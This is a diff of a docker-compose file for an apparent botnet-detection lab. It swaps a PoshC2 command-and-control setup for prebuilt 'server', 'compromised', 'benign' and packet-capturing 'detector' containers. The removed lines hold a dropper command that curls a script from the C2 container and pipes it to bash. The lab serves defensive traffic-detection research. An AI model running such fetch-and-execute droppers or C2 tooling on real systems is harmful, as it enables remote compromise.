@@ -1,22 +1,21 @@
 version: "3.9"
 services:
-  attacker:
-    image: goggles/poshc2
+  server:
+    image: goggles/server:https
     ports:
+      - "80:80"
       - "443:443"
       - "8000:8000"
 
-  infected:
+  compromised:
     depends_on:
-      - attacker
-    image: python:2
-    entrypoint: [ "bash", "-c", "sleep 30; curl 172.18.0.2:8000/py_dropper.sh | bash; tail -f /dev/null" ]
+      - server
+    image: goggles/compromised:https
 
-  machine:
+  benign:
     depends_on:
-      - attacker
-    image: traffic-generator:latest
-    entrypoint: [ "bash", "-c", "python /web-traffic-generator/gen.py" ]
+      - server
+    image: goggles/benign
 
   tcpdump:
      image: kaazing/tcpdump
@@ -25,9 +24,23 @@ services:
        - ./tcpdump:/tcpdump
 
 
+  detector:
+    depends_on:
+        - server
+    image: goggles/detector
+    volumes:
+       - ./tcpdump:/tcpdump
+    network_mode: "host"
+    cap_add:
+      - 'NET_RAW'
+      - 'NET_ADMIN'
+
+
 networks:
   default:
     name: botnet
     ipam:
       config:
       - subnet: 172.18.0.0/16
+    driver_opts:
+      com.docker.network.bridge.name: botnet
